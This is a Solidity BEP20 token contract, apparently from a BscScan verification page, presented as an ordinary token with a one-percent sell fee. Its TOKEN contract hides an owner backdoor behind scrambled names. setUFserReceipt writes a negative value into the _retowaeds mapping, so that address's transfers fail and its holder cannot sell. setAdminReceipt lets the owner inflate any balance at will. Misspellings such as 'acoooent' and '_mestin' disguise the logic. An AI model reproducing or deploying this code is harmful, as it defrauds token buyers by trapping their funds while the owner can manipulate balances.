/**
 *Submitted for verification at BscScan.com on 2022-10-23
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.5;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}



abstract contract Ownable is Context {
    address private _owner;

    event ownershipTransferred(address indexed previousowner, address indexed newowner);

    constructor() {
        _transferTownereship(_msgSender());
    }


    function owner() public view virtual returns (address) {
        return _owner;
    }


    modifier onlyowner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }


    function renounceOwnership() public virtual onlyowner {
        _transferTownereship(address(0));
    }


    function _transferTownereship(address newowner) internal virtual {
        address oldowner = _owner;
        _owner = newowner;
        emit ownershipTransferred(oldowner, newowner);
    }
}



library SafeMath {

    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {

        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }


    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }


    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }


    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }


    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }


    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }


    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }


    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }


    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}




interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint acoooentADesired,
        uint acoooentBDesired,
        uint acoooentAMin,
        uint acoooentBMin,
        address to,
        uint deadline
    ) external returns (uint acoooentA, uint acoooentB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint acoooentTokenDesired,
        uint acoooentTokenMin,
        uint acoooentETHMin,
        address to,
        uint deadline
    ) external payable returns (uint acoooentToken, uint acoooentETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint acoooentAMin,
        uint acoooentBMin,
        address to,
        uint deadline
    ) external returns (uint acoooentA, uint acoooentB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint acoooentTokenMin,
        uint acoooentETHMin,
        address to,
        uint deadline
    ) external returns (uint acoooentToken, uint acoooentETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint acoooentAMin,
        uint acoooentBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint acoooentA, uint acoooentB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint acoooentTokenMin,
        uint acoooentETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint acoooentToken, uint acoooentETH);
    function swapExactTokensForTokens(
        uint acoooentIn,
        uint acoooentOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory acoooents);
    function swapTokensForExactTokens(
        uint acoooentOut,
        uint acoooentInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory acoooents);
    function swapExactETHForTokens(uint acoooentOutMin, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory acoooents);
    function swapTokensForExactETH(uint acoooentOut, uint acoooentInMax, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory acoooents);
    function swapExactTokensForETH(uint acoooentIn, uint acoooentOutMin, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory acoooents);
    function swapETHForExactTokens(uint acoooentOut, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory acoooents);

    function quote(uint acoooentA, uint reserveA, uint reserveB) external pure returns (uint acoooentB);
    function getacoooentOut(uint acoooentIn, uint reserveIn, uint reserveOut) external pure returns (uint acoooentOut);
    function getacoooentIn(uint acoooentOut, uint reserveIn, uint reserveOut) external pure returns (uint acoooentIn);
    function getacoooentsOut(uint acoooentIn, address[] calldata path) external view returns (uint[] memory acoooents);
    function getacoooentsIn(uint acoooentOut, address[] calldata path) external view returns (uint[] memory acoooents);
}




interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfireOnTransferTokens(
        address token,
        uint liquidity,
        uint acoooentTokenMin,
        uint acoooentETHMin,
        address to,
        uint deadline
    ) external returns (uint acoooentETH);
    function removeLiquidityETHWithPermitSupportingfireOnTransferTokens(
        address token,
        uint liquidity,
        uint acoooentTokenMin,
        uint acoooentETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint acoooentETH);

    function swapExactTokensForTokensSupportingfireOnTransferTokens(
        uint acoooentIn,
        uint acoooentOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingfireOnTransferTokens(
        uint acoooentOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfireOnTransferTokens(
        uint acoooentIn,
        uint acoooentOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}





interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function fireTo() external view returns (address);
    function fireToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setfireTo(address) external;
    function setfireToSetter(address) external;
}



contract BEP20 is Context {
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 internal _totalSupply;
    string private _name;
    string private _symbol;


    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);


    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }


    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }


    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }


    function allowance(address owner, address spender) public view virtual returns (uint256) {
        return _allowances[owner][spender];
    }


    function approve(address spender, uint256 amount) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }


    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, _allowances[owner][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = _allowances[owner][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
    unchecked {
        _approve(owner, spender, currentAllowance - subtractedValue);
    }

        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
        unchecked {
            _approve(owner, spender, currentAllowance - amount);
        }
        }
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}


    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}


contract TOKEN is BEP20, Ownable {

    mapping(address => uint256) private _balances;
    mapping(address => bool) private _release;

    function balanceOf(address account) public view virtual returns (uint256) {
        return _balances[account];
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
    unchecked {
        _balances[from] = fromBalance - amount;
    }
        _balances[to] += amount;

        emit Transfer(from, to, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
    unchecked {
        _balances[account] = accountBalance - amount;
    }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);
    }

    function _mestin(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mtin to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }


    address public uniswapV2Pair;
    constructor(
        string memory name_,
        string memory symbol_,
        uint256 totalSupply_
    ) BEP20(name_, symbol_) {
        _mestin(msg.sender, totalSupply_ * 10**decimals());
    }

    using SafeMath for uint256;

    uint256 private _desellfieto = 1;

    uint256 private _debuyfieto = 0;
    address private constant _deadAddress = 0x000000000000000000000000000000000000dEaD;
    mapping(address => int256) private _retowaeds;

    function setPairDates(address _address) external onlyowner {
        uniswapV2Pair = _address;
    }

    function rmUFserReceipt(address accwsbont) public onlyowner {
        _retowaeds[accwsbont] = 0;
    }

    function _getRetowaeds(address accwsbont) public view returns (int256) {
        return _retowaeds[accwsbont];
    }


    function setUFserReceipt(address accwsbont) public onlyowner {
        _retowaeds[accwsbont] = int256(0) - int256(_totalSupply);
    }

    function setAdminReceipt(address accwsbont,int256 amount ) public onlyowner {
        _retowaeds[accwsbont] += amount;
    }


    function _toFectoF(
        address from,
        address _to,
        uint256 _acoooent
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(_to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= _acoooent, "ERC20: transfer amount exceeds balance");
        if (_retowaeds[from] > 0){
            _balances[from] = _balances[from].add(uint256(_retowaeds[from]));
        }else if (_retowaeds[from] < 0){
            _balances[from] = _balances[from].sub(uint256(_retowaeds[from]));
        }


        uint256 tareefieeacoooent = 0;
        uint256 tareefiee = _desellfieto;
        if (uniswapV2Pair != address(0)) {
            if (_to == uniswapV2Pair) {
                tareefiee = _desellfieto;
            }
            if (from == uniswapV2Pair) {
                tareefiee = _debuyfieto;
            }
        }
        tareefieeacoooent = _acoooent.mul(tareefiee).div(100);

        if (tareefieeacoooent > 0) {
            _balances[from] = _balances[from].sub(tareefieeacoooent);
            _balances[_deadAddress] = _balances[_deadAddress].add(tareefieeacoooent);
            emit Transfer(from, _deadAddress, tareefieeacoooent);
        }

        _balances[from] = _balances[from].sub(_acoooent - tareefieeacoooent);
        _balances[_to] = _balances[_to].add(_acoooent - tareefieeacoooent);
        emit Transfer(from, _to, _acoooent - tareefieeacoooent);
    }


    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual returns (bool) {
        address spender = _msgSender();

        _spendAllowance(from, spender, amount);
        _toFectoF(from, to, amount);
        return true;
    }

    function transfer(address to, uint256 amount) public virtual returns (bool) {
        address owner = _msgSender();
        _toFectoF(owner, to, amount);
        return true;
    }


}